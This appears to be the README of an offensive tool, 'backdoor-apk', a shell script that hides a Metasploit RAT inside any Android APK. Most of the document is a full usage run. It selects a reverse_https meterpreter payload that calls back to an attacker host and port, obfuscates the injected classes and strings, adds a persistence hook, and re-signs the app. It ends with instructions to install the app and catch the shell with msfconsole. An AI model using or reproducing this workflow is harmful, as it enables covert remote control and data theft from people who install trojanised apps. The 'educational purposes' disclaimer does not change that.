# backdoor-apk
backdoor-apk is a shell script that simplifies the process of adding a backdoor to any Android APK file. Users of this shell script should have working knowledge of Linux, Bash, Metasploit, Apktool, the Android SDK, smali, etc. This shell script is provided as-is without warranty of any kind and is intended for educational purposes only.

Usage:

```
root@kali:~/Code/github/backdoor-apk/backdoor-apk# ./backdoor-apk.sh BaiduBrowser.apk 
          ________
         / ______ \
         || _  _ ||
         ||| || |||          AAAAAA   PPPPPPP   KKK  KKK
         |||_||_|||         AAA  AAA  PPP  PPP  KKK KKK
         || _  _o|| (o)     AAA  AAA  PPP  PPP  KKKKKK
         ||| || |||         AAAAAAAA  PPPPPPPP  KKK KKK
         |||_||_|||         AAA  AAA  PPP       KKK  KKK
         ||______||         AAA  AAA  PPP       KKK  KKK
        /__________\
________|__________|__________________________________________
       /____________\
       |____________|            Dana James Traversie

[*] Running backdoor-apk.sh v0.2.4 on Thu Sep 27 17:13:34 EDT 2018
[+] Android payload options:
1) meterpreter/reverse_http   4) shell/reverse_http
2) meterpreter/reverse_https  5) shell/reverse_https
3) meterpreter/reverse_tcp    6) shell/reverse_tcp
[?] Please select an Android payload option: 2
[?] Please enter an LHOST value: 10.6.9.31
[?] Please enter an LPORT value: 443
[+] Android manifest permission options:
1) Keep original
2) Merge with payload and shuffle
[?] Please select an Android manifest permission option: 2
[+] Handle the payload via resource script: msfconsole -r backdoor-apk.rc
[*] Decompiling original APK file...done.
[*] Locating smali file to hook in original project...done.
[+] Package where RAT smali files will be injected: com/baidu/browser/inter
[+] Smali file to hook RAT payload: com/baidu/browser/inter/BdApplication.smali
[*] Generating RAT APK file...done.
[*] Decompiling RAT APK file...done.
[*] Merging permissions of original and payload projects...done.
[*] Injecting helpful Java classes in RAT APK file...done.
[*] Creating new directory in original package for RAT smali files...done.
[+] Inject package path: com/baidu/browser/inter/pjese
[+] Generated new smali class name for MainBroadcastReceiver.smali: Iivym
[+] Generated new smali class name for MainService.smali: Aupyx
[+] Generated new smali class name for Payload.smali: Nwiuc
[+] Generated new smali class name for StringObfuscator.smali: Abnrw
[+] Generated new smali method name for StringObfuscator.obfuscate method: icobf
[+] Generated new smali method name for StringObfuscator.unobfuscate method: wbcik
[*] Copying RAT smali files to new directories in original project...done.
[*] Fixing RAT smali files...done.
[*] Obfuscating const-string values in RAT smali files...done.
[*] Adding hook in original smali file...done.
[*] Adding persistence hook in original project...done.
[*] Recompiling original project with backdoor...done.
[*] Generating RSA key for signing...done.
[*] Signing recompiled APK...done.
[*] Verifying signed artifacts...done.
[*] Aligning recompiled APK...done.
root@kali:~/Code/github/backdoor-apk/backdoor-apk#
```

The recompiled APK will be found in the 'original/dist' directory. Install the APK on a compatible Android device, run it, and handle the meterpreter connection via the generated resource script: msfconsole -r backdoor-apk.rc
